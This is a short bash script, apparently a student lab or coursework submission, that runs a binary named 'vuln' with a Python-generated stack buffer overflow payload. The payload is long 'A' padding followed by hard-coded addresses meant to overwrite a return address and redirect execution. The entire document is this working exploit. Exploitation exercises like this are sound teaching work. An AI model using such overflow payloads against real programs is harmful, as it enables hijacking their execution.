#!/usr/bin/env bash

/task2/s2895113/vuln $(python3 -c "import sys; sys.stdout.buffer.write(b'A'*1297 + b'\x50\xd0\xff\xff' + b'\x01'*24 + b'\xc6\x91\x04\x08')")